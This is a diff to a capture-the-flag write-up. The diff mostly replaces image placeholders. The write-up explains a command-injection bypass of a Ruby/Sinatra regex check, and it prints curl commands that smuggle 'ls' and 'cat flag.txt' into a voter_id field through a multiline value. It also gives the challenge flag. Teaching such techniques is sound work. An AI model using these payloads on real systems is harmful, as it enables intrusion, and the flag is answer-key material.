@@ -10,11 +10,13 @@ There's only one field and I'm sure my regex is perfect!
 
 For this challenge, we are presented with a simple web application with a single text box where we can enter a `voter ID`: 
 
-vveve
+<img width="812" height="482" alt="vveeve" src="https://github.com/user-attachments/assets/da64bc56-8a2c-4601-89fd-1de409d6fe28" />
+
 
 If we send a POST request without the `voter_id` parameter set, we can throw an error and hit the debug page:
 
-ve.png
+<img width="897" height="566" alt="ve" src="https://github.com/user-attachments/assets/05069707-3f13-4e7d-a7a8-8528d036ec31" />
+
 
 We can see the source code logic behind the application, and note that the webapp is built with Ruby using the Sinatra framework:
 
@@ -49,7 +51,8 @@ So, if we send a multiline string where one of the lines matches the regex, and 
 curl -X POST http://3.105.27.130:8002/ -d $'voter_id; ls;\nABCD1234'
 ```
 
-ve1
+<img width="933" height="618" alt="ve1" src="https://github.com/user-attachments/assets/72798a97-4bdc-4e79-8538-0cc02fd8f8c3" />
+
 
 - And then read the flag with:
 
@@ -57,6 +60,7 @@ ve1
 curl -X POST http://3.105.27.130:8002/ -d $'voter_id; cat flag.txt;\nABCD1234'
 ```
 
-ve2
+<img width="919" height="514" alt="ve2" src="https://github.com/user-attachments/assets/34eefdff-9fcb-40ab-a243-330751d631f3" />
+
 
 `secedu{h0_b0y_th3y'r3_in_we'3r_in_tr0ubl3_ar3n't_w3}`
